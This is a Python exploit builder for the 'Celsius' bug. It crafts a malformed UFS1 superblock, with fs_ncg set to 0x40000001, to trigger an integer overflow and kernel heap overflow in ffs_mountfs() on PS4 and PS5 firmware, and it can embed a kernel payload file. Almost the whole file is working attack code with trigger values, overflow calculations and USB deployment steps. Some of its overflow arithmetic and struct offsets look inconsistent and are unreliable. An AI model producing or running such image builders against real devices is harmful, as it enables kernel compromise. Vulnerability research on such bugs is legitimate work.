#!/usr/bin/env python3
"""
build_celsius_ufs.py — Celsius (ffs_mount) UFS image builder for PS4 ≤13.04

Builds a malformed UFS/FFS image that triggers the integer overflow in
ffs_mountfs() (sys/ufs/ffs/ffs_vfsops.c).

Bug:
    size = fs->fs_cssize;
    if (fs->fs_contigsumsize > 0)
        size += fs->fs_ncg * sizeof(int32_t);   // INTEGER OVERFLOW
    size += fs->fs_ncg * sizeof(u_int8_t);       // INTEGER OVERFLOW
    space = malloc((u_long)size, M_UFSMNT, M_WAITOK);  // small alloc
    ...
    for (i = 0; i < fs->fs_ncg; i++)
        *lp++ = fs->fs_contigsumsize;            // HEAP OVERFLOW

Trigger values:
    fs_ncg = 0x40000001 → size overflows to small value
    fs_contigsumsize > 0 → triggers vulnerable path
    fs_cssize = small → initial size before overflow

Discovered by: bollars
Works on: PS4 ≤13.04, PS5 ≤12.70
Patched in: PS4 13.50, PS5 13.00

Usage:
    python3 build_celsius_ufs.py -o celsius.img
    python3 build_celsius_ufs.py -o celsius.img --ncg 0x40000001 --survey
    python3 build_celsius_ufs.py -o celsius.img --payload kpatch.bin

Then copy to USB:
    On PS4: USB mounted at /mnt/usb0/
    The exploit page loads this via mount("ufs", ...) syscall

Credits: bollars (discovery), Victor (guidance), adri22235 (implementation)
"""

import struct
import argparse
import os
import hashlib

# ============================================================
# UFS/FFS constants (FreeBSD 9)
# ============================================================
SBLOCKSIZE   = 8192        # Superblock size
SBLOCK_UFS2  = 65536       # Superblock offset for UFS2
SBLOCK_UFS1  = 8192        # Superblock offset for UFS1 (PS4 uses this)
DEV_BSIZE    = 512         # Device block size
MAXBSIZE     = 65536       # Maximum block size
MAXFRAG      = 8           # Maximum fragments per block

# UFS1 magic numbers
FS_UFS1_MAGIC = 0x00011954  # UFS1 superblock magic
FS_UFS2_MAGIC = 0x19540119  # UFS2 superblock magic

# FreeBSD 9 struct fs offsets (for UFS1)
# These match the PS4 kernel's struct fs layout
FS_SBLKNO      = 0       # addr of super-block in filesys
FS_CBLKNO      = 4       # offset of cyl-block in filesys
FS_IBLKNO      = 8       # offset of inode-blocks in filesys
FS_DBLKNO      = 12      # offset of first data after cg
FS_NCYL        = 16      # number of cylinders
FS_BSIZE       = 20      # size of basic blocks in fs
FS_FSIZE       = 24      # size of frag blocks in fs
FS_FRAG        = 28      # number of frags in a block in fs
FS_MINFREE     = 32      # minimum percentage of free blocks
FS_BMASK       = 36      # ``blkoff'' calc of blk offsets (int32)
FS_FMASK       = 40      # ``fragoff'' calc of frag offsets (int32)
FS_BSHIFT      = 44      # ``lblkno'' calc of logical blkno (int32)
FS_FSHIFT      = 48      # ``numfrags'' calc number of frags (int32)

# Key fields for the exploit
FS_CGSIZE_OFF  = 96       # fs_cgsize (int32)
FS_CSSIZE_OFF  = 128      # fs_cssize (int32) — initial size value
FS_NCG_OFF     = 180      # fs_ncg (int32) — CONTROLS THE OVERFLOW
FS_CONTIGSUM_OFF = 184    # fs_contigsumsize (int32) — must be > 0
FS_MAXBPG_OFF  = 188      # fs_maxbpg (int32)

# UFS1: superblock is 1376 bytes (struct fs)
FS_SIZE        = 1376
FS_MAGIC_OFF   = 1372     # fs_magic at end of struct

# Cylinder group
CG_MAGIC       = 0x00090255

# Overflow calculation:
# With fs_ncg = 0x40000001:
#   sizeof(int32_t) = 4
#   fs_ncg * 4 = 0x100000004 → truncated to 0x4 (32-bit overflow!)
#   sizeof(u_int8_t) = 1
#   fs_ncg * 1 = 0x40000001 → truncated (another overflow)
#   Total addition to size ≈ 5 bytes extra instead of ~5GB
#   malloc(fs_cssize + 5) = small buffer
#   Then loop writes fs_ncg (1,073,741,825) int32_t entries = 4GB+ heap overflow!


def make_superblock(ncg, cssize, contigsumsize, bsize, fsize, survey=False):
    """Build a malicious UFS1 superblock"""
    sb = bytearray(SBLOCKSIZE)

    # Basic filesystem geometry (must pass validation)
    frag = bsize // fsize
    cgsize = 2048  # Cylinder group size

    # fs_sblkno — superblock block number
    struct.pack_into('<i', sb, FS_SBLKNO, SBLOCK_UFS1 // fsize)
    # fs_cblkno — cylinder block offset
    struct.pack_into('<i', sb, FS_CBLKNO, (SBLOCK_UFS1 + SBLOCKSIZE) // fsize)
    # fs_iblkno — inode block offset
    struct.pack_into('<i', sb, FS_IBLKNO, (SBLOCK_UFS1 + SBLOCKSIZE + cgsize) // fsize)
    # fs_dblkno — first data block offset
    struct.pack_into('<i', sb, FS_DBLKNO, (SBLOCK_UFS1 + SBLOCKSIZE + cgsize + bsize) // fsize)

    # fs_ncyl — number of cylinders
    struct.pack_into('<i', sb, FS_NCYL, ncg)

    # fs_bsize — block size (MUST pass: fs_bsize > 0 && fs_bsize <= MAXBSIZE)
    struct.pack_into('<i', sb, FS_BSIZE, bsize)

    # fs_fsize — fragment size (MUST pass: fs_fsize > 0 && fs_fsize <= fs_bsize)
    struct.pack_into('<i', sb, FS_FSIZE, fsize)

    # fs_frag — fragments per block
    struct.pack_into('<i', sb, FS_FRAG, frag)

    # fs_minfree — minimum free space %
    struct.pack_into('<i', sb, FS_MINFREE, 5)

    # Block masks and shifts
    struct.pack_into('<i', sb, FS_BMASK, -(bsize))         # fs_bmask
    struct.pack_into('<i', sb, FS_FMASK, -(fsize))         # fs_fmask

    # Calculate shifts
    bshift = 0
    v = bsize
    while v > 1:
        bshift += 1
        v >>= 1
    fshift = 0
    v = fsize
    while v > 1:
        fshift += 1
        v >>= 1

    struct.pack_into('<i', sb, FS_BSHIFT, bshift)          # fs_bshift
    struct.pack_into('<i', sb, FS_FSHIFT, fshift)          # fs_fshift

    # fs_cgsize
    struct.pack_into('<i', sb, FS_CGSIZE_OFF, cgsize)

    # === THE EXPLOIT FIELDS ===

    # fs_cssize — cylinder summary information size
    # This is the base for the malloc size calculation
    # Must be > 0 and small enough that overflow result is small
    struct.pack_into('<i', sb, FS_CSSIZE_OFF, cssize)

    # fs_ncg — number of cylinder groups
    # 0x40000001 causes: ncg * 4 = 0x100000004 → 0x4 (32-bit truncation)
    struct.pack_into('<I', sb, FS_NCG_OFF, ncg)

    # fs_contigsumsize — MUST be > 0 to trigger vulnerable code path
    struct.pack_into('<i', sb, FS_CONTIGSUM_OFF, contigsumsize)

    # fs_maxbpg
    struct.pack_into('<i', sb, FS_MAXBPG_OFF, bsize // fsize)

    # Additional fields needed for validation

    # fs_sbsize (offset 132) — superblock size
    struct.pack_into('<i', sb, 132, SBLOCKSIZE)

    # fs_nindir (offset 136) — BSIZE / sizeof(ufs1_daddr_t)
    struct.pack_into('<i', sb, 136, bsize // 4)

    # fs_inopb (offset 140) — inodes per block
    struct.pack_into('<i', sb, 140, bsize // 128)

    # fs_old_nspf (offset 144) — sectors per fragment
    struct.pack_into('<i', sb, 144, fsize // DEV_BSIZE)

    # fs_csaddr (offset 176) — blk addr of cyl grp summary area
    struct.pack_into('<i', sb, 176, (SBLOCK_UFS1 + SBLOCKSIZE) // fsize + 1)

    # fs_ipg (offset 192) — inodes per group
    struct.pack_into('<i', sb, 192, 2048)

    # fs_fpg (offset 196) — fragments per group
    struct.pack_into('<i', sb, 196, bsize * 8 // fsize)

    # fs_old_cpc (offset 232) — cyl per cycle in postbl
    struct.pack_into('<i', sb, 232, 1)

    # fs_maxbsize (offset 236) — max block size
    struct.pack_into('<i', sb, 236, bsize)

    # fs_flags — UFS1 flags (UFS1 = 0, no SOFTDEP, no SUJ)
    struct.pack_into('<i', sb, 1276, 0)

    # fs_old_flags (offset 260) — old FS_ flags
    struct.pack_into('<i', sb, 260, 0)

    # fs_fmod (offset 1252) — super block modified flag
    sb[1252] = 0

    # fs_clean (offset 1253) — filesystem is clean flag
    sb[1253] = 1  # FSCLEAN

    # fs_ronly (offset 1254) — mounted read-only flag
    sb[1254] = 0

    # fs_magic — UFS1 MAGIC (MUST match exactly)
    struct.pack_into('<I', sb, FS_MAGIC_OFF, FS_UFS1_MAGIC)

    return bytes(sb)


def make_cylinder_group(cgnum, bsize, fsize):
    """Build a minimal cylinder group descriptor"""
    cg = bytearray(2048)

    # cg_magic
    struct.pack_into('<I', cg, 0, CG_MAGIC)

    # cg_cgx — cylinder group number
    struct.pack_into('<i', cg, 12, cgnum)

    # cg_ndblk — number of data blocks this cg
    struct.pack_into('<i', cg, 24, bsize * 8 // fsize)

    # cg_niblk — number of inode blocks this cg
    struct.pack_into('<i', cg, 28, bsize // 128)

    return bytes(cg)


def make_overflow_payload(ncg, contigsumsize, survey=False, kpatch=None):
    """
    Build the data that will overflow the heap.

    In ffs_mountfs(), after the small malloc:
        fs->fs_maxcluster = lp = space;
        for (i = 0; i < fs_ncg; i++)
            *lp++ = fs->fs_contigsumsize;   // writes int32 per iteration

    The first `ncg` int32_t values will be `contigsumsize`.
    We control contigsumsize value but not the pattern.

    For heap grooming, we need adjacent objects to overwrite.
    The payload file goes into the image so it can be referenced
    after kernel r/w is achieved.
    """
    payload_info = {
        'overflow_writes': ncg,          # How many int32_t writes
        'overflow_value': contigsumsize, # Each write = this value
        'overflow_bytes': ncg * 4,       # Total bytes written
        'malloc_size': 0,                # Calculated below
    }

    # Calculate actual malloc size (after overflow)
    size = 256  # fs_cssize (small)
    # With ncg = 0x40000001:
    #   ncg * 4 = 0x100000004 → 0x4 (truncated to 32-bit)
    #   ncg * 1 = 0x40000001 → also overflows in 32-bit
    overflow_add = ((ncg * 4) & 0xFFFFFFFF) + ((ncg * 1) & 0xFFFFFFFF)
    payload_info['malloc_size'] = size + (overflow_add & 0xFFFFFFFF)

    return payload_info


def build_image(args):
    """Build the complete Celsius UFS image"""

    ncg = args.ncg
    cssize = args.cssize
    contigsumsize = args.contigsumsize
    bsize = args.bsize
    fsize = args.fsize

    print("=" * 60)
    print("  Celsius (ffs_mount) UFS Image Builder")
    print("  For PS4 ≤13.04 / PS5 ≤12.70")
    print("=" * 60)
    print()
    print(f"  fs_ncg             = 0x{ncg:08X} ({ncg})")
    print(f"  fs_cssize          = 0x{cssize:08X} ({cssize})")
    print(f"  fs_contigsumsize   = 0x{contigsumsize:08X} ({contigsumsize})")
    print(f"  fs_bsize           = {bsize}")
    print(f"  fs_fsize           = {fsize}")
    print()

    # Calculate overflow
    info = make_overflow_payload(ncg, contigsumsize, survey=args.survey)
    print("  === Overflow Analysis ===")
    print(f"  malloc() size      = {info['malloc_size']} bytes (after overflow)")
    print(f"  Overflow writes    = {info['overflow_writes']} × int32_t")
    print(f"  Overflow value     = 0x{info['overflow_value']:08X}")
    print(f"  Total overflow     = {info['overflow_bytes']} bytes ({info['overflow_bytes'] / (1024**3):.1f} GB)")
    print()

    # Build superblock
    sb = make_superblock(ncg, cssize, contigsumsize, bsize, fsize,
                         survey=args.survey)

    # Build cylinder group (minimal, just to pass initial checks)
    cg = make_cylinder_group(0, bsize, fsize)

    # Assemble image
    # Layout:
    #   0x0000 - Boot block (8KB, zeros)
    #   0x2000 - Superblock (8KB)
    #   0x4000 - Cylinder group 0
    #   0x4800 - Data region (optional payload)

    image_size = args.image_size * 1024 * 1024  # MB → bytes
    image = bytearray(image_size)

    # Write superblock at SBLOCK_UFS1 (8192 = 0x2000)
    image[SBLOCK_UFS1:SBLOCK_UFS1 + len(sb)] = sb

    # Write cylinder group at offset after superblock
    cg_offset = SBLOCK_UFS1 + SBLOCKSIZE
    image[cg_offset:cg_offset + len(cg)] = cg

    # If payload file provided, embed it at a known offset
    payload_offset = 0x10000  # 64KB offset
    if args.payload:
        with open(args.payload, 'rb') as f:
            payload = f.read()
        image[payload_offset:payload_offset + len(payload)] = payload
        print(f"  Payload embedded   = {len(payload)} bytes at 0x{payload_offset:X}")
        print(f"  Payload SHA256     = {hashlib.sha256(payload).hexdigest()[:16]}...")

    # Write image
    with open(args.output, 'wb') as f:
        f.write(bytes(image))

    print(f"  Image written      = {args.output} ({len(image)} bytes)")
    print()

    # Layout summary
    print("  === Image Layout ===")
    print(f"  0x{0:08X}  Boot block (zeroed)")
    print(f"  0x{SBLOCK_UFS1:08X}  Superblock (UFS1, magic=0x{FS_UFS1_MAGIC:08X})")
    print(f"  0x{cg_offset:08X}  Cylinder group 0")
    if args.payload:
        print(f"  0x{payload_offset:08X}  Embedded payload ({len(payload)} bytes)")
    print()

    # Superblock hex dump
    if args.verbose:
        print("  === Superblock Key Fields ===")
        for name, off, fmt in [
            ("fs_bsize",       FS_BSIZE,          '<i'),
            ("fs_fsize",       FS_FSIZE,          '<i'),
            ("fs_cssize",      FS_CSSIZE_OFF,     '<i'),
            ("fs_ncg",         FS_NCG_OFF,        '<I'),
            ("fs_contigsum",   FS_CONTIGSUM_OFF,  '<i'),
            ("fs_magic",       FS_MAGIC_OFF,      '<I'),
        ]:
            val = struct.unpack_from(fmt, sb, off)[0]
            print(f"    [{off:4d}] {name:20s} = 0x{val & 0xFFFFFFFF:08X}")
        print()

    print("  === WARNINGS ===")
    print("  ⚠ This image triggers a KERNEL HEAP OVERFLOW on PS4 ≤13.04")
    print("  ⚠ It WILL cause a kernel panic without proper heap grooming")
    print("  ⚠ Use ONLY on YOUR OWN console for security research")
    print("  ⚠ Patched in PS4 FW 13.50 and PS5 FW 13.00")
    print()
    print(f"  To copy to USB: cp {args.output} /mnt/usb0/celsius.img")
    print()


def main():
    parser = argparse.ArgumentParser(
        description='Celsius (ffs_mount) UFS image builder for PS4 security research',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -o celsius.img                    # Default trigger values
  %(prog)s -o celsius.img --ncg 0x40000001   # Custom ncg
  %(prog)s -o celsius.img --payload kpatch.bin  # Embed kernel payload
  %(prog)s -o celsius.img -v                 # Verbose with hex dumps
        """)

    parser.add_argument('-o', '--output', default='celsius.img',
                       help='Output image filename (default: celsius.img)')
    parser.add_argument('--ncg', type=lambda x: int(x, 0),
                       default=0x40000001,
                       help='fs_ncg value (default: 0x40000001 — triggers overflow)')
    parser.add_argument('--cssize', type=lambda x: int(x, 0),
                       default=256,
                       help='fs_cssize value (default: 256)')
    parser.add_argument('--contigsumsize', type=lambda x: int(x, 0),
                       default=128,
                       help='fs_contigsumsize (default: 128, must be > 0)')
    parser.add_argument('--bsize', type=int, default=8192,
                       help='Block size (default: 8192)')
    parser.add_argument('--fsize', type=int, default=1024,
                       help='Fragment size (default: 1024)')
    parser.add_argument('--image-size', type=int, default=4,
                       help='Image size in MB (default: 4)')
    parser.add_argument('-p', '--payload', type=str, default=None,
                       help='Kernel payload file to embed')
    parser.add_argument('--survey', action='store_true',
                       help='Survey mode: marker pattern for heap analysis')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Verbose output with hex dumps')

    args = parser.parse_args()

    if args.contigsumsize <= 0:
        parser.error("--contigsumsize must be > 0 (triggers vulnerable code path)")
    if args.bsize > MAXBSIZE or args.bsize <= 0:
        parser.error(f"--bsize must be 1..{MAXBSIZE}")
    if args.fsize <= 0 or args.fsize > args.bsize:
        parser.error(f"--fsize must be 1..{args.bsize}")

    build_image(args)


if __name__ == '__main__':
    main()
